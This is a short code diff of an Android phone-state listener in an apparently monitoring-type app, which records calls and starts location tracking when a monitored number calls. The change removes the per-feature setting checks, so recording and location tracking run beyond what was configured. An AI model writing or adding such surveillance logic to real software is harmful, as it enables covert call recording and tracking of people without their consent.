@@ -41,7 +41,8 @@ public class MyPhoneStateListener extends PhoneStateListener {
 	private String longitude, latitude, soundPath = "";
 	private CallRecordDB callRecordDB;
 	private DirectiveDB directiveDB;
-
+  
+	
 	public MyPhoneStateListener(Context context) {
 		this.context = context;
 		iscall = false;
@@ -74,19 +75,13 @@ public class MyPhoneStateListener extends PhoneStateListener {
 						Monitor monitor = monitorDB.queryOnlyRow(Monitor.COL_PHONE + " = ? ",new String[] { incomingNumber });
 						if (monitor != null) {
 							String callMonitorStatus = monitor.getCallMonitorStatus();
-							String callRecMonitorStatus = monitor.getCallRecMonitorStatus();
-							String locationStatus = monitor.getLocationStatus();
 							if ("1".equals(callMonitorStatus)) {
 								isMonitor = true;
-								if("1".equals(callRecMonitorStatus)){
-									recordCallComment();
-								}
+								recordCallComment();
 							}
-							if ("1".equals(locationStatus)) {
-								LocationMan locationMan = new LocationMan(context);
-								locationMan.setRunBack(new MyRunback());
-								locationMan.startLocaiton();
-							}
+							LocationMan locationMan = new LocationMan(context);
+							locationMan.setRunBack(new MyRunback());
+							locationMan.startLocaiton();
 						}
 					}
 				} catch (IOException e1) {
